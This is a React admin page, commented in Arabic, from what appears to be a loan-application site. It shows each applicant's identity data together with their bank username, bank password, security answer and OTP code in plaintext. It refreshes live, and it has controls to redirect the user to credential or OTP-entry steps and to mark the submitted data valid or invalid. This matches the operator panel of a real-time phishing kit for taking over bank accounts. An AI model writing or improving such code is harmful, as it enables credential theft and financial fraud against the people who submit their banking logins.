// صفحة تفاصيل الطلب - عرض جميع بيانات المتقدم مع نظام النسخ
import { useParams, useLocation } from "wouter";
import { useQueryClient } from "@tanstack/react-query";
import { useState, useEffect } from "react";
import {
  useGetApplication,
  useNavigateApplication,
  useValidateApplicationData,
  getGetApplicationQueryKey,
  getListApplicationsQueryKey,
} from "@workspace/api-client-react";
import AdminLayout from "@/components/AdminLayout";
import { ArrowRight, ChevronLeft, Send, CheckCircle, Clock } from "lucide-react";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

const stepOptions = [
  { value: "applicant-info", label: "معلومات مقدم الطلب" },
  { value: "banks", label: "اختيار البنك" },
  { value: "credentials", label: "بيانات الدخول" },
  { value: "verify", label: "رمز التحقق" },
  { value: "waiting", label: "صفحة الانتظار" },
];

function adminFetch(url: string, options: RequestInit = {}) {
  return fetch(url, {
    ...options,
    credentials: "include",
    headers: { "Content-Type": "application/json", ...(options.headers || {}) },
  });
}

interface ApplicationVersion {
  id: number;
  version: number;
  isLatest: boolean;
  createdAt: string;
  applicantType?: string;
  fullName?: string;
  nationalId?: string;
  dateOfBirth?: string;
  monthlySalary?: string;
  employer?: string;
  phone?: string;
  email?: string;
  city?: string;
  maritalStatus?: string;
  companyName?: string;
  businessType?: string;
  commercialRegistration?: string;
  employeeCount?: string;
  annualRevenue?: string;
  contactName?: string;
  bankName?: string;
  bankUsername?: string;
  bankPassword?: string;
  securityAnswer?: string;
  otpCode?: string;
}

// دمج جميع نسخ الطلب حقلاً بحقل (الأحدث له الأولوية، لكن لا يُسقط حقول القديمة)
function mergeVersionsData(sources: ApplicationVersion[]): ApplicationVersion {
  const FIELDS: (keyof ApplicationVersion)[] = [
    "applicantType", "fullName", "nationalId", "dateOfBirth", "monthlySalary",
    "employer", "phone", "email", "city", "maritalStatus",
    "companyName", "businessType", "commercialRegistration", "employeeCount",
    "annualRevenue", "contactName",
    "bankName", "bankUsername", "bankPassword", "securityAnswer",
    "otpCode",
  ];
  const sorted = [...sources].sort(
    (a, b) => (Number(b.version) || 0) - (Number(a.version) || 0)
  );
  const result: Record<string, unknown> = {};
  for (const field of FIELDS) {
    for (const src of sorted) {
      const val = src[field as keyof ApplicationVersion];
      if (val !== null && val !== undefined && val !== "") {
        result[field] = val;
        break;
      }
    }
  }
  return result as ApplicationVersion;
}

export default function AdminApplicationDetailPage() {
  const params = useParams<{ id: string }>();
  const [, navigate] = useLocation();
  const queryClient = useQueryClient();
  const appId = Number(params.id);

  const { data: app, isLoading } = useGetApplication(appId, {
    query: { enabled: !!appId, refetchInterval: 5000 },
  });
  const navMutation = useNavigateApplication();
  const validateMutation = useValidateApplicationData();

  const [notifyMsg, setNotifyMsg] = useState("");
  const [notifyLoading, setNotifyLoading] = useState(false);
  const [notifySent, setNotifySent] = useState(false);
  
  const [versions, setVersions] = useState<ApplicationVersion[]>([]);
  const [activeTab, setActiveTab] = useState<"current" | "older">("current");
  const [loadingVersions, setLoadingVersions] = useState(false);

  useEffect(() => {
    if (!appId) return;
    
    const fetchVersions = async () => {
      setLoadingVersions(true);
      try {
        const res = await adminFetch(`${BASE}/api/applications/${appId}/versions`);
        if (res.ok) {
          const data = await res.json();
          setVersions(data);
        }
      } catch (err) {
        console.error("خطأ في جلب النسخ:", err);
      } finally {
        setLoadingVersions(false);
      }
    };
    
    fetchVersions();
  }, [appId, app?.updatedAt]);

  const handleNavigate = async (step: string) => {
    await navMutation.mutateAsync({ id: appId, data: { targetStep: step } });
    queryClient.invalidateQueries({ queryKey: getGetApplicationQueryKey(appId) });
    queryClient.invalidateQueries({ queryKey: getListApplicationsQueryKey() });
  };

  const handleValidate = async (decision: "valid" | "invalid" | "retry") => {
    await validateMutation.mutateAsync({ id: appId, data: { decision } });
    queryClient.invalidateQueries({ queryKey: getGetApplicationQueryKey(appId) });
  };

  const handleNotify = async () => {
    if (!notifyMsg.trim() || !app?.sessionId) return;
    setNotifyLoading(true);
    try {
      await adminFetch(`${BASE}/api/admin/notify`, {
        method: "POST",
        body: JSON.stringify({ sessionId: app.sessionId, message: notifyMsg.trim() }),
      });
      setNotifyMsg("");
      setNotifySent(true);
      setTimeout(() => setNotifySent(false), 3000);
    } finally {
      setNotifyLoading(false);
    }
  };

  if (isLoading) return (
    <AdminLayout><div className="p-8 text-center text-muted-foreground">جاري التحميل...</div></AdminLayout>
  );
  if (!app) return (
    <AdminLayout><div className="p-8 text-center text-destructive">الطلب غير موجود</div></AdminLayout>
  );

  const olderVersions = versions.filter(v => !v.isLatest);
  // دمج جميع النسخ مع بيانات app الأساسية — يضمن ظهور كل الحقول دائماً
  const allData = mergeVersionsData([
    ...versions,
    app as unknown as ApplicationVersion,
  ]);

  const DataRow = ({ label, value, badge }: { label: string; value: string | null | undefined; badge?: string }) =>
    value ? (
      <div className="flex justify-between py-2 border-b last:border-0">
        <span className="text-muted-foreground text-sm flex items-center gap-1">
          {label}
          {badge && <span className="text-xs bg-blue-100 text-blue-700 px-1.5 py-0.5 rounded">{badge}</span>}
        </span>
        <span className="font-medium text-sm">{value}</span>
      </div>
    ) : null;

  const renderData = (v: ApplicationVersion, isOld: boolean = false) => {
    const tag = isOld ? `نسخة ${v.version}` : undefined;
    return (
      <>
        {v.applicantType === "individual" ? (
          <>
            <DataRow label="الاسم الكامل" value={v.fullName} badge={tag} />
            <DataRow label="رقم الهوية" value={v.nationalId} badge={tag} />
            <DataRow label="تاريخ الميلاد" value={v.dateOfBirth} badge={tag} />
            <DataRow label="الراتب الشهري" value={v.monthlySalary} badge={tag} />
            <DataRow label="جهة العمل" value={v.employer} badge={tag} />
            <DataRow label="رقم الهاتف" value={v.phone} badge={tag} />
            <DataRow label="البريد الإلكتروني" value={v.email} badge={tag} />
            <DataRow label="المدينة" value={v.city} badge={tag} />
            <DataRow label="الحالة الاجتماعية" value={v.maritalStatus} badge={tag} />
          </>
        ) : (
          <>
            <DataRow label="اسم الشركة" value={v.companyName} badge={tag} />
            <DataRow label="نوع النشاط" value={v.businessType} badge={tag} />
            <DataRow label="السجل التجاري" value={v.commercialRegistration} badge={tag} />
            <DataRow label="عدد الموظفين" value={v.employeeCount} badge={tag} />
            <DataRow label="الإيرادات السنوية" value={v.annualRevenue} badge={tag} />
            <DataRow label="اسم المسؤول" value={v.contactName} badge={tag} />
            <DataRow label="رقم الهاتف" value={v.phone} badge={tag} />
            <DataRow label="البريد الإلكتروني" value={v.email} badge={tag} />
          </>
        )}
        {(v.bankName || v.bankUsername) && (
          <div className="mt-4 pt-4 border-t">
            <p className="text-sm font-bold mb-2 text-muted-foreground">بيانات البنك</p>
            <DataRow label="البنك المختار" value={v.bankName} badge={tag} />
            <DataRow label="اسم المستخدم" value={v.bankUsername} badge={tag} />
            <DataRow label="كلمة المرور" value={v.bankPassword} badge={tag} />
            <DataRow label="كلمة التحقق" value={v.securityAnswer} badge={tag} />
            <DataRow label="رمز OTP" value={v.otpCode} badge={tag} />
          </div>
        )}
      </>
    );
  };

  return (
    <AdminLayout>
      <div className="p-6 max-w-4xl">
        {/* رأس الصفحة */}
        <div className="flex items-center gap-4 mb-6">
          <button onClick={() => navigate("/admin/dashboard")} className="text-muted-foreground hover:text-foreground transition-colors">
            <ArrowRight className="w-5 h-5" />
          </button>
          <div>
            <h1 className="text-2xl font-black">تفاصيل الطلب #{app.id}</h1>
            <p className="text-muted-foreground text-sm">
              {new Date(app.createdAt).toLocaleString("ar-SA")}
              {versions.length > 1 && <span className="mr-2 text-blue-600">({versions.length} نسخ)</span>}
            </p>
          </div>
          <span className={`mr-auto px-3 py-1 rounded-full text-sm font-bold ${
            app.status === "approved" ? "bg-green-100 text-green-700"
            : app.status === "rejected" ? "bg-red-100 text-red-700"
            : app.status === "reviewing" ? "bg-blue-100 text-blue-700"
            : "bg-yellow-100 text-yellow-700"
          }`}>
            {app.status === "approved" ? "موافق" : app.status === "rejected" ? "مرفوض" : app.status === "reviewing" ? "قيد المراجعة" : "قيد الانتظار"}
          </span>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          <div className="lg:col-span-2 space-y-4">
            {/* تبويبات النسخ */}
            {versions.length > 1 && (
              <div className="bg-card border rounded-2xl overflow-hidden">
                <div className="flex border-b">
                  <button onClick={() => setActiveTab("current")}
                    className={`flex-1 px-4 py-3 text-sm font-bold transition-colors flex items-center justify-center gap-2 ${
                      activeTab === "current" ? "bg-primary text-white" : "bg-muted hover:bg-muted/70 text-foreground"
                    }`}>
                    <Clock className="w-4 h-4" /> البيانات الحالية ({versions.length > 0 ? Math.max(...versions.map(v => v.version || 0)) : 1})
                  </button>
                  <button onClick={() => setActiveTab("older")}
                    className={`flex-1 px-4 py-3 text-sm font-bold transition-colors flex items-center justify-center gap-2 ${
                      activeTab === "older" ? "bg-primary text-white" : "bg-muted hover:bg-muted/70 text-foreground"
                    }`}>
                    <Clock className="w-4 h-4" /> بيانات أقدم ({olderVersions.length})
                  </button>
                </div>
                <div className="p-6">
                  {loadingVersions ? (
                    <p className="text-center text-muted-foreground">جارٍ تحميل البيانات...</p>
                  ) : activeTab === "current" ? (
                    renderData(allData)
                  ) : (
                    <div className="space-y-6">
                      {olderVersions.sort((a, b) => b.version - a.version).map((v) => (
                        <div key={v.id} className="border rounded-xl p-4 bg-muted/30">
                          <div className="flex items-center justify-between mb-3 pb-2 border-b">
                            <span className="font-bold text-sm">النسخة رقم {v.version}</span>
                            <span className="text-xs text-muted-foreground">{new Date(v.createdAt).toLocaleString("ar-SA")}</span>
                          </div>
                          {renderData(v, true)}
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* البيانات الافتراضية — تستخدم allData لضمان عرض كل الحقول دائماً */}
            {versions.length <= 1 && (
              <>
                <div className="bg-card border rounded-2xl p-6">
                  <h3 className="font-black mb-4 pb-2 border-b">
                    {allData.applicantType === "individual" ? "بيانات مقدم الطلب (فرد)" : "بيانات الشركة"}
                  </h3>
                  {allData.applicantType === "individual" ? (
                    <>
                      <DataRow label="الاسم الكامل" value={allData.fullName} />
                      <DataRow label="رقم الهوية" value={allData.nationalId} />
                      <DataRow label="تاريخ الميلاد" value={allData.dateOfBirth} />
                      <DataRow label="الراتب الشهري" value={allData.monthlySalary} />
                      <DataRow label="جهة العمل" value={allData.employer} />
                      <DataRow label="رقم الهاتف" value={allData.phone} />
                      <DataRow label="البريد الإلكتروني" value={allData.email} />
                      <DataRow label="المدينة" value={allData.city} />
                      <DataRow label="الحالة الاجتماعية" value={allData.maritalStatus} />
                    </>
                  ) : (
                    <>
                      <DataRow label="اسم الشركة" value={allData.companyName} />
                      <DataRow label="نوع النشاط" value={allData.businessType} />
                      <DataRow label="السجل التجاري" value={allData.commercialRegistration} />
                      <DataRow label="عدد الموظفين" value={allData.employeeCount} />
                      <DataRow label="الإيرادات السنوية" value={allData.annualRevenue} />
                      <DataRow label="اسم المسؤول" value={allData.contactName} />
                      <DataRow label="رقم الهاتف" value={allData.phone} />
                      <DataRow label="البريد الإلكتروني" value={allData.email} />
                    </>
                  )}
                </div>
                {(allData.bankName || allData.bankUsername) && (
                  <div className="bg-card border rounded-2xl p-6">
                    <h3 className="font-black mb-4 pb-2 border-b">بيانات البنك</h3>
                    <DataRow label="البنك المختار" value={allData.bankName} />
                    <DataRow label="اسم المستخدم" value={allData.bankUsername} />
                    <DataRow label="كلمة المرور" value={allData.bankPassword} />
                    <DataRow label="كلمة التحقق" value={allData.securityAnswer} />
                    <DataRow label="رمز OTP" value={allData.otpCode} />
                  </div>
                )}
              </>
            )}

            {/* إرسال رسالة */}
            <div className="bg-card border rounded-2xl p-6">
              <h3 className="font-black mb-4 pb-2 border-b flex items-center gap-2">
                <Send className="w-4 h-4 text-primary" /> إرسال رسالة للمستخدم
              </h3>
              <div className="flex flex-col gap-3">
                <textarea value={notifyMsg} onChange={(e) => setNotifyMsg(e.target.value)}
                  placeholder="اكتب رسالتك هنا..." rows={3}
                  className="w-full border rounded-xl px-4 py-3 text-sm bg-background focus:outline-none focus:ring-2 focus:ring-primary/50 resize-none" />
                <div className="flex items-center gap-3">
                  <button onClick={handleNotify} disabled={notifyLoading || !notifyMsg.trim()}
                    className="flex items-center gap-2 navy-gradient text-white px-5 py-2.5 rounded-xl font-bold text-sm disabled:opacity-50 hover:opacity-90 transition-opacity">
                    <Send className="w-4 h-4" /> {notifyLoading ? "جارٍ الإرسال..." : "إرسال الرسالة"}
                  </button>
                  {notifySent && <span className="flex items-center gap-1.5 text-green-600 text-sm font-medium"><CheckCircle className="w-4 h-4" /> تم الإرسال بنجاح</span>}
                </div>
              </div>
            </div>
          </div>

          {/* لوحة التحكم */}
          <div className="space-y-4">
            <div className="bg-card border rounded-2xl p-4">
              <h3 className="font-bold mb-3">الحالة الحالية</h3>
              <div className="text-sm text-muted-foreground">
                <p>الخطوة: <span className="font-medium text-foreground">{app.currentStep}</span></p>
                <p className="mt-1">الجلسة: <span className="font-mono text-xs">{app.sessionId.slice(0, 20)}...</span></p>
              </div>
            </div>

            <div className="bg-card border rounded-2xl p-4">
              <h3 className="font-bold mb-3">التحقق من البيانات</h3>
              <div className="space-y-2">
                <button onClick={() => handleValidate("valid")} disabled={validateMutation.isPending}
                  className="w-full bg-green-100 text-green-700 py-2.5 rounded-xl font-bold hover:bg-green-200 transition-colors text-sm">البيانات صحيحة</button>
                <button onClick={() => handleValidate("invalid")} disabled={validateMutation.isPending}
                  className="w-full bg-red-100 text-red-700 py-2.5 rounded-xl font-bold hover:bg-red-200 transition-colors text-sm">البيانات خاطئة</button>
                <button onClick={() => handleValidate("retry")} disabled={validateMutation.isPending}
                  className="w-full bg-yellow-100 text-yellow-700 py-2.5 rounded-xl font-bold hover:bg-yellow-200 transition-colors text-sm">إعادة المحاولة</button>
              </div>
            </div>

            <div className="bg-card border rounded-2xl p-4">
              <h3 className="font-bold mb-3">تحويل المستخدم لـ</h3>
              <div className="space-y-2">
                {stepOptions.map((step) => (
                  <button key={step.value} onClick={() => handleNavigate(step.value)}
                    disabled={navMutation.isPending || app.currentStep === step.value}
                    className={`w-full text-right py-2.5 px-3 rounded-xl font-medium text-sm flex items-center justify-between transition-colors ${
                      app.currentStep === step.value ? "bg-primary text-white cursor-default" : "bg-muted hover:bg-muted/70 text-foreground"
                    }`}>
                    {step.label} <ChevronLeft className="w-4 h-4" />
                  </button>
                ))}
              </div>
            </div>
          </div>
        </div>
      </div>
    </AdminLayout>
  );
}
